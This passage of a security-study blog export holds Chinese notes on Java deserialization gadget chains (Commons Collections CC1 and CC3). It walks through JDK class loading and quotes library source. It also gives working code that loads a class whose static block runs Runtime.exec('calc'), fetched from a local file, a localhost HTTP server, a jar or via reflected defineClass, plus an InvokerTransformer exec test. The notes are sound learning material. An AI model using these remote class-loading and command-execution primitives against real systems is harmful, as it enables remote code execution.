+需要检查 method.getName() 和调用栈。
+误区三：原始 Map 没有变化就说明利用链没有执行。
+不一定。反序列化恢复的是新对象图，通常不会直接修改序列化前的原始 Map。
+误区四：不断按 F7 就一定能看到完整链条。
+不一定。反序列化存在大量内部调用，更适合使用关键位置断点和 Frames 分析。
+
+十二、目前的实验结果与结论已完成：
+
+Commons Collections Maven 环境搭建。
+
+Transformer 基础实验。
+
+InvokerTransformer 反射源码分析。
+
+ChainedTransformer 调用过程 Debug。
+
+LazyMap.get() 的触发条件分析。
+
+Java 动态代理原理学习。
+
+AnnotationInvocationHandler.readObject() 源码阅读。
+
+AnnotationInvocationHandler.invoke() 源码阅读。
+
+JDK 8u65 环境配置。
+
+
+尚未完成：
+
+在真实 CC1 对象图反序列化过程中，明确捕获到 ChainedTransformer.transform() 的调用栈。
+
+独立编写完整无害 PoC。
+
+TransformedMap 版本的源码分析和实验。
+
+
+因此，目前应该将学习状态定义为：
+已理解经典 CC1 LazyMap 版本的主要调用原理，但尚未完成完整链条的动态验证。
+
+十三、下一步：TransformedMap 版本 CC1参考文章：
+Java 反序列化 Commons-Collections 篇01—CC1 链
+下一阶段采用逆向追踪方式：
+InvokerTransformer.transform()           ↑ChainedTransformer.transform()           ↑TransformedMap.checkSetValue()           ↑Map.Entry.setValue()           ↑AnnotationInvocationHandler.readObject()
+
+主要研究：
+
+TransformedMap 与 LazyMap 的区别。
+
+checkSetValue() 为什么会调用 Transformer。
+
+Map.Entry.setValue() 如何触发值转换。
+
+AnnotationInvocationHandler.readObject() 中哪些条件会导致 setValue() 被执行。
+
+如何从源码独立构建对象关系，并使用无害操作验证反序列化调用路径。
+
+通过 Debug 验证调用栈，解释每个方法被调用的原因。
+
+
+最终目标：能够不依赖现成 EXP，独立分析触发路径，并编写可验证原理的本地无害 PoC。
+
+本系列笔记： Java安全学习 · Java 反序列化漏洞：CommonsCollections1（CC1）学习笔记 · cc1链学习 · 正版cc1链学习 · cc3链学习 · cc6链学习
+]]></content>
+      <categories>
+        <category>安全学习</category>
+        <category>Java 反序列化</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+        <tag>反序列化</tag>
+        <tag>CC1</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>cc3链学习</title>
+    <url>//2026/11/01/cc3-classloading/</url>
+    <content><![CDATA[CC3 学习前的准备cc3链和之前就完全不同了，在正式开始学习cc3之前你首先要搞明白类加载的过程，我看了一个视频简直像听天书一样，还是要自己跟进去看一下，接下来我们深入代码研究一下底层类加载的过程
+//        获取当前使用的类加载器          ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader();  //        加载类并获取返回的Class对象          Class&lt;?&gt; aClass = systemClassLoader.loadClass(&quot;TestClass&quot;);  //        实例化          aClass.newInstance();
+
+断点追踪类加载过程我们在加载类这一行设置断点强制步入进入jdk的内部观察原理首先来到了Classloader类的loadclass方法我们事先已经知道我们获取当前使用的类加载器应该是launcher里面的appclassloader，但是我们为什么首先进入了classloader呢，因为app里面loadclass要求传入两个参数我们只传入了一个所以首先进入他的父类返回两个参数之后在传给他
+public Class&lt;?&gt; loadClass(String name) throws ClassNotFoundException &#123;      return loadClass(name, false);  &#125;
+接着步入进入了launcher里面的loadclass
+public Class&lt;?&gt; loadClass(String name, boolean resolve)      throws ClassNotFoundException  &#123;      int i = name.lastIndexOf(&#x27;.&#x27;);      if (i != -1) &#123;          SecurityManager sm = System.getSecurityManager();          if (sm != null) &#123;              sm.checkPackageAccess(name.substring(0, i));          &#125;      &#125;        if (ucp.knownToNotExist(name)) &#123;          // The class of the given name is not found in the parent          // class loader as well as its local URLClassPath.        // Check if this class has already been defined dynamically;        // if so, return the loaded class; otherwise, skip the parent        // delegation and findClass.        Class&lt;?&gt; c = findLoadedClass(name);          if (c != null) &#123;              if (resolve) &#123;                  resolveClass(c);              &#125;              return c;          &#125;          throw new ClassNotFoundException(name);      &#125;        return (super.loadClass(name, resolve));  &#125;
+knownToNotExist这个方法会对获取到的类名进行一个缓存检查看是否有缓存且可以被使用，具体代码在URLclasspath里面
+synchronized boolean knownToNotExist(String name) &#123;    return this.lookupCacheURLs != null &amp;&amp; lookupCacheEnabled        ? knownToNotExist0(this.lookupCacheLoader, name)        : false;&#125;
+如果这个类没有缓存或者缓存不可用则返回flase接着进行查询操作
+接着运行到return (super.loadClass(name, resolve)); ，我们发现他会把内容重新交给他的父类，这也是我们看到他在转圈的原因
+在进行一些安全检查之后我们发现他有调用了父类的loadclass又回到了classloader里面，怎么在转圈啊
+protected Class&lt;?&gt; loadClass(String name, boolean resolve)      throws ClassNotFoundException  &#123;      synchronized (getClassLoadingLock(name)) &#123;          // First, check if the class has already been loaded          Class&lt;?&gt; c = findLoadedClass(name);          if (c == null) &#123;              long t0 = System.nanoTime();              try &#123;                  if (parent != null) &#123;                      c = parent.loadClass(name, false);                  &#125; else &#123;                      c = findBootstrapClassOrNull(name);                  &#125;              &#125; catch (ClassNotFoundException e) &#123;                  // ClassNotFoundException thrown if class not found                  // from the non-null parent class loader            &#125;                if (c == null) &#123;                  // If still not found, then invoke findClass in order                  // to find the class.                long t1 = System.nanoTime();                  c = findClass(name);                    // this is the defining class loader; record the stats                  sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);                  sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);                  sun.misc.PerfCounter.getFindClasses().increment();              &#125;          &#125;          if (resolve) &#123;              resolveClass(c);          &#125;          return c;      &#125;  &#125;
+protected Object getClassLoadingLock(String className) &#123;      Object lock = this;      if (parallelLockMap != null) &#123;          Object newLock = new Object();          lock = parallelLockMap.putIfAbsent(className, newLock);          if (lock == null) &#123;              lock = newLock;          &#125;      &#125;      return lock;  &#125;
+首先进入这个方法中，我们看注释可以知道这个方法是检查这个类是否被加载过这段代码是获取加载某个类的时候使用的锁对象，暂时先不了解这个跳过接着进行代码然后进入findloadclass
+protected final Class&lt;?&gt; findLoadedClass(String name) &#123;      if (!checkName(name))          return null;      return findLoadedClass0(name);  &#125;
+很明显从字面上看进行名称的检查，进入checkname的方法
+private boolean checkName(String name) &#123;      if ((name == null) || (name.length() == 0))          return true;      if ((name.indexOf(&#x27;/&#x27;) != -1)          || (!VM.allowArraySyntax() &amp;&amp; (name.charAt(0) == &#x27;[&#x27;)))          return false;      return true;  &#125;
+就当学习java了，name为空可以返回true，带&#x2F;不支持数组语法的时候不允许[]，然后检查完成这个类没有被加载过所以返回null，继续委派查询
+protected Class&lt;?&gt; loadClass(String name, boolean resolve)      throws ClassNotFoundException  &#123;      synchronized (getClassLoadingLock(name)) &#123;          // First, check if the class has already been loaded          Class&lt;?&gt; c = findLoadedClass(name);          if (c == null) &#123;              long t0 = System.nanoTime();              try &#123;                  if (parent != null) &#123;                      c = parent.loadClass(name, false);                  &#125; else &#123;                      c = findBootstrapClassOrNull(name);                  &#125;              &#125; catch (ClassNotFoundException e) &#123;                  // ClassNotFoundException thrown if class not found                  // from the non-null parent class loader            &#125;                if (c == null) &#123;                  // If still not found, then invoke findClass in order                  // to find the class.                long t1 = System.nanoTime();                  c = findClass(name);                    // this is the defining class loader; record the stats                  sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);                  sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);                  sun.misc.PerfCounter.getFindClasses().increment();              &#125;          &#125;          if (resolve) &#123;              resolveClass(c);          &#125;          return c;      &#125;  &#125;
+
+委派与 findClass这里是关键代码再贴出来一遍方便查看我们现在就开始进入双亲委派的流程了，不过不应该叫双亲委派应该叫单亲委派，自己没加载就请求要父加载器加载按照双亲委派的流程我们这个例子应该是由应用加载器交给扩展类加载器，扩展类加载器交给启动类加载器接着我们看代码，c为null，然后由parent执行loadclass，我们发下他执行是按照一样的代码又走了一遍，虽然代码一样但实际执行查找的位置是不一样的然后进入启动类加载器，当然啦最终还是没有找到代码接着往下走
+if (c == null) &#123;                  // If still not found, then invoke findClass in order                  // to find the class.                long t1 = System.nanoTime();                  c = findClass(name);                  
+从这个代码里我们进入了urlclassloader为什么会进入这个类呢？我们知道appclassloader和extclassloader都是launcher这个类里面的内部静态类，我们可以很明显的看到这个静态类是直接继承自urlclassloader的
+static class AppClassLoader extends URLClassLoader &#123;
+因为这里面没有重写findclass这个方法，所以去到了他的父类
+protected Class&lt;?&gt; findClass(final String name)      throws ClassNotFoundException  &#123;      final Class&lt;?&gt; result;      try &#123;          result = AccessController.doPrivileged(              new PrivilegedExceptionAction&lt;Class&lt;?&gt;&gt;() &#123;                  public Class&lt;?&gt; run() throws ClassNotFoundException &#123;                      String path = name.replace(&#x27;.&#x27;, &#x27;/&#x27;).concat(&quot;.class&quot;);                      Resource res = ucp.getResource(path, false);                      if (res != null) &#123;                          try &#123;                              return defineClass(name, res);                          &#125; catch (IOException e) &#123;                              throw new ClassNotFoundException(name, e);                          &#125;                      &#125; else &#123;                          return null;                      &#125;                  &#125;              &#125;, acc);      &#125; catch (java.security.PrivilegedActionException pae) &#123;          throw (ClassNotFoundException) pae.getException();      &#125;      if (result == null) &#123;          throw new ClassNotFoundException(name);      &#125;      return result;  &#125;
+这段代码的寻找方式是把点换成&#x2F;再后面加上class，去寻找这个文件，存在就读取字节码进行定义，找不到就抛出错误
+public Resource getResource(String name, boolean check) &#123;    Loader loader;    int[] cache = getLookupCache(name);    for (int i = 0;         (loader = getNextLoader(cache, i)) != null;         i++) &#123;        Resource res = loader.getResource(name, check);        if (res != null) &#123;            return res;        &#125;    &#125;    return null;&#125;
+找到则返回找不到返回null但是我们发现返回的结果是null，为什么找不到呢，因为我们现在的加载器是扩展类加载器应该是到应用类加载器的时候才可以找到然后到应用类加载器的时候进入defineclass里面
+private Class&lt;?&gt; defineClass(String name, Resource res) throws IOException &#123;      long t0 = System.nanoTime();      int i = name.lastIndexOf(&#x27;.&#x27;);      URL url = res.getCodeSourceURL();      if (i != -1) &#123;          String pkgname = name.substring(0, i);          // Check if package already loaded.          Manifest man = res.getManifest();          definePackageInternal(pkgname, man, url);      &#125;      // Now read the class bytes and define the class      java.nio.ByteBuffer bb = res.getByteBuffer();      if (bb != null) &#123;          // Use (direct) ByteBuffer:          CodeSigner[] signers = res.getCodeSigners();          CodeSource cs = new CodeSource(url, signers);          sun.misc.PerfCounter.getReadClassBytesTime().addElapsedTimeFrom(t0);          return defineClass(name, bb, cs);      &#125; else &#123;          byte[] b = res.getBytes();          // must read certificates AFTER reading bytes.          CodeSigner[] signers = res.getCodeSigners();          CodeSource cs = new CodeSource(url, signers);          sun.misc.PerfCounter.getReadClassBytesTime().addElapsedTimeFrom(t0);          return defineClass(name, b, 0, b.length, cs);      &#125;  &#125;
+我们可以看到最后是返回一个defineclass然后我们发现进入了secureclassloader
+    return defineClass(name, b, off, len, getProtectionDomain(cs));  &#125;
+依旧是返回defineclass，参数不同又进入了他的父类classloader
+protected final Class&lt;?&gt; defineClass(String name, byte[] b, int off, int len,                                       ProtectionDomain protectionDomain)      throws ClassFormatError  &#123;      protectionDomain = preDefineClass(name, protectionDomain);      String source = defineClassSourceLocation(protectionDomain);      Class&lt;?&gt; c = defineClass1(name, b, off, len, protectionDomain, source);      postDefineClass(c, protectionDomain);      return c;  &#125;
+private native Class&lt;?&gt; defineClass0(String name, byte[] b, int off, int len,                                       ProtectionDomain pd);    private native Class&lt;?&gt; defineClass1(String name, byte[] b, int off, int len,                                       ProtectionDomain pd, String source);    private native Class&lt;?&gt; defineClass2(String name, java.nio.ByteBuffer b,                                       int off, int len, ProtectionDomain pd,                                       String source);
+这些就是加载类的具体代码然后就是把结果不断返回，类加载终于结束了
+本地和远程加载实验我们理解清楚之后就可以尝试远程加载class文件了，这才是我们想干的事情，我们是勾八黑客
+接下来尝试加载恶意类，先编写一个恶意类编译之后放在c盘的src的文件夹中
+package src;    import java.io.IOException;    // URLClassLoader 的 file 协议  public class Calc &#123;      static &#123;          try &#123;              Runtime.getRuntime().exec(&quot;calc&quot;);   &#125; catch (IOException e)&#123;              e.printStackTrace();   &#125;      &#125;  &#125;
+然后在本项目中尝试加载它
+import java.net.URL;  import java.net.URLClassLoader;    public class filerce &#123;      public static void main(String[] args) throws Exception &#123;          URLClassLoader dife = new URLClassLoader(new URL[]&#123;new URL(&quot;file:///C:/&quot;)&#125;);          Class&lt;?&gt; aClass = dife.loadClass(&quot;src.Calc&quot;);          aClass.newInstance();      &#125;  &#125;
+显然成功了要是不成功我就不把代码放在上面了接下来是远程加载恶意类
+import java.net.URL;  import java.net.URLClassLoader;    public class filerce &#123;      public static void main(String[] args) throws Exception &#123;          URLClassLoader dife = new URLClassLoader(new URL[]&#123;new URL(&quot;http://127.0.0.1:1233/&quot;)&#125;);          Class&lt;?&gt; aClass = dife.loadClass(&quot;src.Calc&quot;);          aClass.newInstance();      &#125;  &#125;
+成功弹出计算器使用jar
+import java.net.URL;  import java.net.URLClassLoader;    public class filerce &#123;      public static void main(String[] args) throws Exception &#123;          URLClassLoader dife = new URLClassLoader(new URL[]&#123;new URL(&quot;jar:file:///C:/src/Calc.jar!/&quot;)&#125;);          Class&lt;?&gt; aClass = dife.loadClass(&quot;src.Calc&quot;);          aClass.newInstance();      &#125;  &#125;
+http+jar
+import java.net.URL;  import java.net.URLClassLoader;    public class filerce &#123;      public static void main(String[] args) throws Exception &#123;          URLClassLoader dife = new URLClassLoader(new URL[]&#123;new URL(&quot;jar:http://127.0.0.1:1233/Calc.jar!/&quot;)&#125;);          Class&lt;?&gt; aClass = dife.loadClass(&quot;src.Calc&quot;);          aClass.newInstance();      &#125;  &#125;
+
+梳理 loadClass、findClass 与 defineClass现在我们重新梳理一下这里涉及到的三个关键方法loadclass：从已经加载的类里面去寻找findclass：按照URL指定的方式去寻找defineclass：处理前面传递回来的字节码加载类接下来我们尝试直接调用defineclass来直接加载我们的恶意类
+import java.lang.reflect.Method;  import java.net.URL;  import java.net.URLClassLoader;  import java.nio.file.Files;  import java.nio.file.Path;  import java.nio.file.Paths;    public class filerce &#123;      public static void main(String[] args) throws Exception &#123;  //        由于defineclass是一个受保护的方法，因此我们只能通过反射调用，所以我们获取加载器来获取Class来反射调用          ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader();          Method defineClass = ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;, String.class, byte[].class, int.class, int.class);          defineClass.setAccessible(true);          byte[] bytes = Files.readAllBytes(Paths.get(&quot;C://src/Calc.class&quot;));          Class calcclass = (Class) defineClass.invoke(systemClassLoader, &quot;src.Calc&quot;, bytes, 0, bytes.length);          calcclass.newInstance();      &#125;  &#125;
+
+
+本系列笔记： Java安全学习 · Java 反序列化漏洞：CommonsCollections1（CC1）学习笔记 · cc1链学习 · 正版cc1链学习 · cc3链学习 · cc6链学习
+]]></content>
+      <categories>
+        <category>安全学习</category>
+        <category>Java 反序列化</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+        <tag>反序列化</tag>
+        <tag>CC3</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>cc1链学习</title>
+    <url>//2026/11/01/cc1-transformedmap/</url>
+    <content><![CDATA[从 Transformer 接口入手根据前人挖洞的审核，我们从Transformer这个接口入口，我们发现这个这个接口很简单，输入一个内容然后执行方法
+public interface Transformer &#123;        /**       * Transforms the input object (leaving it unchanged) into some output object.     *     * @param input  the object to be transformed, should be left unchanged       * @return a transformed object       * @throws ClassCastException (runtime) if the input is the wrong class       * @throws IllegalArgumentException (runtime) if the input is invalid       * @throws FunctorException (runtime) if the transform cannot be completed       */    public Object transform(Object input);    &#125;
+我们查找这个接口的具体实现类，我们发现有很多，先看chain的类
+/*   *  Licensed to the Apache Software Foundation (ASF) under one or more *  contributor license agreements.  See the NOTICE file distributed with *  this work for additional information regarding copyright ownership. *  The ASF licenses this file to You under the Apache License, Version 2.0 *  (the &quot;License&quot;); you may not use this file except in compliance with *  the License.  You may obtain a copy of the License at * *      http://www.apache.org/licenses/LICENSE-2.0 * *  Unless required by applicable law or agreed to in writing, software *  distributed under the License is distributed on an &quot;AS IS&quot; BASIS, *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. *  See the License for the specific language governing permissions and *  limitations under the License. */package org.apache.commons.collections.functors;    import java.io.Serializable;  import java.util.Collection;  import java.util.Iterator;    import org.apache.commons.collections.Transformer;    /**   * Transformer implementation that chains the specified transformers together. * &lt;p&gt;   * The input object is passed to the first transformer. The transformed result   * is passed to the second transformer and so on. ** @since Commons Collections 3.0   * @version $Revision: 646777 $ $Date: 2008-04-10 13:33:15 +0100 (Thu, 10 Apr 2008) $   * * @author Stephen Colebourne   */public class ChainedTransformer implements Transformer, Serializable &#123;        /** Serial version UID */      private static final long serialVersionUID = 3514945074733160196L;        /** The transformers to call in turn */      private final Transformer[] iTransformers;        /**       * Factory method that performs validation and copies the parameter array.     ** @param transformers  the transformers to chain, copied, no nulls       * @return the &lt;code&gt;chained&lt;/code&gt; transformer       * @throws IllegalArgumentException if the transformers array is null       * @throws IllegalArgumentException if any transformer in the array is null       */    public static Transformer getInstance(Transformer[] transformers) &#123;          FunctorUtils.validate(transformers);          if (transformers.length == 0) &#123;              return NOPTransformer.INSTANCE;          &#125;          transformers = FunctorUtils.copy(transformers);          return new ChainedTransformer(transformers);      &#125;            /**       * Create a new Transformer that calls each transformer in turn, passing the     * result into the next transformer. The ordering is that of the iterator()       * method on the collection.     ** @param transformers  a collection of transformers to chain       * @return the &lt;code&gt;chained&lt;/code&gt; transformer       * @throws IllegalArgumentException if the transformers collection is null       * @throws IllegalArgumentException if any transformer in the collection is null       */    public static Transformer getInstance(Collection transformers) &#123;          if (transformers == null) &#123;              throw new IllegalArgumentException(&quot;Transformer collection must not be null&quot;);          &#125;          if (transformers.size() == 0) &#123;              return NOPTransformer.INSTANCE;          &#125;          // convert to array like this to guarantee iterator() ordering          Transformer[] cmds = new Transformer[transformers.size()];          int i = 0;          for (Iterator it = transformers.iterator(); it.hasNext();) &#123;              cmds[i++] = (Transformer) it.next();          &#125;          FunctorUtils.validate(cmds);          return new ChainedTransformer(cmds);      &#125;        /**       * Factory method that performs validation.     ** @param transformer1  the first transformer, not null       * @param transformer2  the second transformer, not null       * @return the &lt;code&gt;chained&lt;/code&gt; transformer       * @throws IllegalArgumentException if either transformer is null       */    public static Transformer getInstance(Transformer transformer1, Transformer transformer2) &#123;          if (transformer1 == null || transformer2 == null) &#123;              throw new IllegalArgumentException(&quot;Transformers must not be null&quot;);          &#125;          Transformer[] transformers = new Transformer[] &#123; transformer1, transformer2 &#125;;          return new ChainedTransformer(transformers);      &#125;        /**       * Constructor that performs no validation.     * Use &lt;code&gt;getInstance&lt;/code&gt; if you want that.       ** @param transformers  the transformers to chain, not copied, no nulls       */    public ChainedTransformer(Transformer[] transformers) &#123;          super();          iTransformers = transformers;      &#125;        /**       * Transforms the input to result via each decorated transformer     ** @param object  the input object passed to the first transformer       * @return the transformed result       */    public Object transform(Object object) &#123;          for (int i = 0; i &lt; iTransformers.length; i++) &#123;              object = iTransformers[i].transform(object);          &#125;          return object;      &#125;        /**       * Gets the transformers, do not modify the array.     * @return the transformers       * @since Commons Collections 3.1       */    public Transformer[] getTransformers() &#123;          return iTransformers;      &#125;    &#125;
+
+InvokerTransformer 与命令执行实现功能吧不同的transformer类连成一个链，前一个的结果是后一个的输入，但是我们没有找到可以直接执行危险命令的地方，接下来我们看invoke的类
+我们首先是要发现一个能执行危险函数的地方，也就是能执行exec的地方，java里执行exec是Runtime类里面的一个方法。
+/*   *  Licensed to the Apache Software Foundation (ASF) under one or more *  contributor license agreements.  See the NOTICE file distributed with *  this work for additional information regarding copyright ownership. *  The ASF licenses this file to You under the Apache License, Version 2.0 *  (the &quot;License&quot;); you may not use this file except in compliance with *  the License.  You may obtain a copy of the License at * *      http://www.apache.org/licenses/LICENSE-2.0 * *  Unless required by applicable law or agreed to in writing, software *  distributed under the License is distributed on an &quot;AS IS&quot; BASIS, *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. *  See the License for the specific language governing permissions and *  limitations under the License. */package org.apache.commons.collections.functors;    import java.io.Serializable;  import java.lang.reflect.InvocationTargetException;  import java.lang.reflect.Method;    import org.apache.commons.collections.FunctorException;  import org.apache.commons.collections.Transformer;    /**   * Transformer implementation that creates a new object instance by reflection. ** @since Commons Collections 3.0   * @version $Revision: 646777 $ $Date: 2008-04-10 13:33:15 +0100 (Thu, 10 Apr 2008) $   * * @author Stephen Colebourne   */public class InvokerTransformer implements Transformer, Serializable &#123;        /** The serial version */      private static final long serialVersionUID = -8653385846894047688L;            /** The method name to call */      private final String iMethodName;      /** The array of reflection parameter types */      private final Class[] iParamTypes;      /** The array of reflection arguments */      private final Object[] iArgs;        /**       * Gets an instance of this transformer calling a specific method with no arguments.     ** @param methodName  the method name to call       * @return an invoker transformer       * @since Commons Collections 3.1       */    public static Transformer getInstance(String methodName) &#123;          if (methodName == null) &#123;              throw new IllegalArgumentException(&quot;The method to invoke must not be null&quot;);          &#125;          return new InvokerTransformer(methodName);      &#125;        /**       * Gets an instance of this transformer calling a specific method with specific values.     ** @param methodName  the method name to call       * @param paramTypes  the parameter types of the method       * @param args  the arguments to pass to the method       * @return an invoker transformer       */    public static Transformer getInstance(String methodName, Class[] paramTypes, Object[] args) &#123;          if (methodName == null) &#123;              throw new IllegalArgumentException(&quot;The method to invoke must not be null&quot;);          &#125;          if (((paramTypes == null) &amp;&amp; (args != null))              || ((paramTypes != null) &amp;&amp; (args == null))              || ((paramTypes != null) &amp;&amp; (args != null) &amp;&amp; (paramTypes.length != args.length))) &#123;              throw new IllegalArgumentException(&quot;The parameter types must match the arguments&quot;);          &#125;          if (paramTypes == null || paramTypes.length == 0) &#123;              return new InvokerTransformer(methodName);          &#125; else &#123;              paramTypes = (Class[]) paramTypes.clone();              args = (Object[]) args.clone();              return new InvokerTransformer(methodName, paramTypes, args);          &#125;      &#125;        /**       * Constructor for no arg instance.     ** @param methodName  the method to call       */    private InvokerTransformer(String methodName) &#123;          super();          iMethodName = methodName;          iParamTypes = null;          iArgs = null;      &#125;        /**       * Constructor that performs no validation.     * Use &lt;code&gt;getInstance&lt;/code&gt; if you want that.       ** @param methodName  the method to call       * @param paramTypes  the constructor parameter types, not cloned       * @param args  the constructor arguments, not cloned       */    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;          super();          iMethodName = methodName;          iParamTypes = paramTypes;          iArgs = args;      &#125;        /**       * Transforms the input to result by invoking a method on the input.     ** @param input  the input object to transform       * @return the transformed result, null if null input       */    public Object transform(Object input) &#123;          if (input == null) &#123;              return null;          &#125;          try &#123;              Class cls = input.getClass();              Method method = cls.getMethod(iMethodName, iParamTypes);              return method.invoke(input, iArgs);                            &#125; catch (NoSuchMethodException ex) &#123;              throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; does not exist&quot;);          &#125; catch (IllegalAccessException ex) &#123;              throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; cannot be accessed&quot;);          &#125; catch (InvocationTargetException ex) &#123;              throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; threw an exception&quot;, ex);          &#125;      &#125;    &#125;
+我们观察一下这个invoketransformer他有两个构造方法，一个是传入方法名进行构造，这是是私有的，另一个是传入方法名，参数类型以及参数值进行构造，这个方法是公有的。还有根据参数的不同形成的几个工厂方法然后我们看他这里是怎么实现这个transformer方法的。这个方法要有一个输入，根据这个输入确定Class，然后通过反射去执行这个命令
+public Object transform(Object input) &#123;      if (input == null) &#123;          return null;      &#125;      try &#123;          Class cls = input.getClass();          Method method = cls.getMethod(iMethodName, iParamTypes);          return method.invoke(input, iArgs);
+到这一步我们就发现了我们貌似可以通过这个方法实现任意命令的一个执行，我们先写一个简单的测试一下。
+public class CC1Step1 &#123;      public static void main(String[] args) throws Exception &#123;          Runtime runtime = Runtime.getRuntime();          InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);          invokerTransformer.transform(runtime);        &#125;  &#125;
+
+我们创建一个Runtime，然后实例化一个InvokeTransformer，调用他的transformer方法这样就实现了我们执行任意命令的目的，这也就是利用链的链尾部分。
+寻找 Transformer 的调用位置我们为了形成一个完整的攻击链，从攻击者的角度考虑，服务端只给我们提供了一个反序列化的入口，所以我们上传的是一个序列化的数据，一般来说能序列化的就是对象和集合，所以很明显我们要找谁调用了transformer这个方法。
+然后我们发现在TransformerMap这个类里面有三个方法都调用了这个方法。
+/*   *  Licensed to the Apache Software Foundation (ASF) under one or more *  contributor license agreements.  See the NOTICE file distributed with *  this work for additional information regarding copyright ownership. *  The ASF licenses this file to You under the Apache License, Version 2.0 *  (the &quot;License&quot;); you may not use this file except in compliance with *  the License.  You may obtain a copy of the License at * *      http://www.apache.org/licenses/LICENSE-2.0 * *  Unless required by applicable law or agreed to in writing, software *  distributed under the License is distributed on an &quot;AS IS&quot; BASIS, *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. *  See the License for the specific language governing permissions and *  limitations under the License. */package org.apache.commons.collections.map;    import java.io.IOException;  import java.io.ObjectInputStream;  import java.io.ObjectOutputStream;  import java.io.Serializable;  import java.util.Iterator;  import java.util.Map;    import org.apache.commons.collections.Transformer;    /**   * Decorates another &lt;code&gt;Map&lt;/code&gt; to transform objects that are added.   * &lt;p&gt;   * The Map put methods and Map.Entry setValue method are affected by this class.   * Thus objects must be removed or searched for using their transformed form. * For example, if the transformation converts Strings to Integers, you must * use the Integer form to remove objects. * &lt;p&gt;   * &lt;strong&gt;Note that TransformedMap is not synchronized and is not thread-safe.&lt;/strong&gt;   * If you wish to use this map from multiple threads concurrently, you must use   * appropriate synchronization. The simplest approach is to wrap this map * using &#123;@link java.util.Collections#synchronizedMap(Map)&#125;. This class may throw    * exceptions when accessed by concurrent threads without synchronization.   * &lt;p&gt;   * This class is Serializable from Commons Collections 3.1.   * * @since Commons Collections 3.0   * @version $Revision: 646777 $ $Date: 2008-04-10 13:33:15 +0100 (Thu, 10 Apr 2008) $   ** @author Stephen Colebourne   */public class TransformedMap          extends AbstractInputCheckedMapDecorator          implements Serializable &#123;        /** Serialization version */      private static final long serialVersionUID = 7023152376788900464L;        /** The transformer to use for the key */      protected final Transformer keyTransformer;      /** The transformer to use for the value */      protected final Transformer valueTransformer;        /**       * Factory method to create a transforming map.     * &lt;p&gt;       * If there are any elements already in the map being decorated, they       * are NOT transformed.     * Constrast this with &#123;@link #decorateTransform&#125;.       ** @param map  the map to decorate, must not be null       * @param keyTransformer  the transformer to use for key conversion, null means no transformation       * @param valueTransformer  the transformer to use for value conversion, null means no transformation       * @throws IllegalArgumentException if map is null       */    public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;          return new TransformedMap(map, keyTransformer, valueTransformer);      &#125;        /**       * Factory method to create a transforming map that will transform     * existing contents of the specified map.     * &lt;p&gt;       * If there are any elements already in the map being decorated, they       * will be transformed by this method.     * Constrast this with &#123;@link #decorate&#125;.       ** @param map  the map to decorate, must not be null       * @param keyTransformer  the transformer to use for key conversion, null means no transformation       * @param valueTransformer  the transformer to use for value conversion, null means no transformation       * @throws IllegalArgumentException if map is null       * @since Commons Collections 3.2       */    public static Map decorateTransform(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;          TransformedMap decorated = new TransformedMap(map, keyTransformer, valueTransformer);          if (map.size() &gt; 0) &#123;              Map transformed = decorated.transformMap(map);              decorated.clear();              decorated.getMap().putAll(transformed);  // avoids double transformation          &#125;          return decorated;      &#125;        //-----------------------------------------------------------------------      /**       * Constructor that wraps (not copies).     * &lt;p&gt;       * If there are any elements already in the collection being decorated, they       * are NOT transformed.     ** @param map  the map to decorate, must not be null       * @param keyTransformer  the transformer to use for key conversion, null means no conversion       * @param valueTransformer  the transformer to use for value conversion, null means no conversion       * @throws IllegalArgumentException if map is null       */    protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;          super(map);          this.keyTransformer = keyTransformer;          this.valueTransformer = valueTransformer;      &#125;        //-----------------------------------------------------------------------      /**       * Write the map out using a custom routine.     ** @param out  the output stream       * @throws IOException       * @since Commons Collections 3.1       */    private void writeObject(ObjectOutputStream out) throws IOException &#123;          out.defaultWriteObject();          out.writeObject(map);      &#125;        /**       * Read the map in using a custom routine.     ** @param in  the input stream       * @throws IOException       * @throws ClassNotFoundException       * @since Commons Collections 3.1       */    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException &#123;          in.defaultReadObject();          map = (Map) in.readObject();      &#125;        //-----------------------------------------------------------------------      /**       * Transforms a key.     * &lt;p&gt;       * The transformer itself may throw an exception if necessary.       ** @param object  the object to transform       * @throws the transformed object       */    protected Object transformKey(Object object) &#123;          if (keyTransformer == null) &#123;              return object;          &#125;          return keyTransformer.transform(object);      &#125;        /**       * Transforms a value.     * &lt;p&gt;       * The transformer itself may throw an exception if necessary.       ** @param object  the object to transform       * @throws the transformed object       */    protected Object transformValue(Object object) &#123;          if (valueTransformer == null) &#123;              return object;          &#125;          return valueTransformer.transform(object);      &#125;        /**       * Transforms a map.     * &lt;p&gt;       * The transformer itself may throw an exception if necessary.       ** @param map  the map to transform       * @throws the transformed object       */    protected Map transformMap(Map map) &#123;          if (map.isEmpty()) &#123;              return map;          &#125;          Map result = new LinkedMap(map.size());          for (Iterator it = map.entrySet().iterator(); it.hasNext(); ) &#123;              Map.Entry entry = 